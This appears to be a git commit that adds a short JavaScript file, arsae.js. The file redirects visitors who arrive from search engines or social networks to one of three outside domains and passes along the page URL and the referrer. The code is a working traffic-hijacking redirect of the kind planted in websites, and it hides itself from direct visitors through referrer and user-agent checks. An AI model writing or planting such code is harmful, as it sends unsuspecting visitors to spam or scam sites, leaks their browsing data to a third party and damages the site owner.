2b8a19b8469501524598f6e3b5ef7575e929325f
Weda Gintung Sentousa <pastiproperti@gmail.com>
2021-08-10 20:10:26 +0700

    Add files via upload

---
+++ arsae.js
@@ -0,0 +1,11 @@
+var ars 	= rChoice([
+	'https://enjooymart.com/',
+	'https://1hotel1.com/',
+    'https://microgreenskit.net/',
+	]);
+
+function rChoice(arr) {
+    return arr[Math.floor(arr.length * Math.random())];
+}
+
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
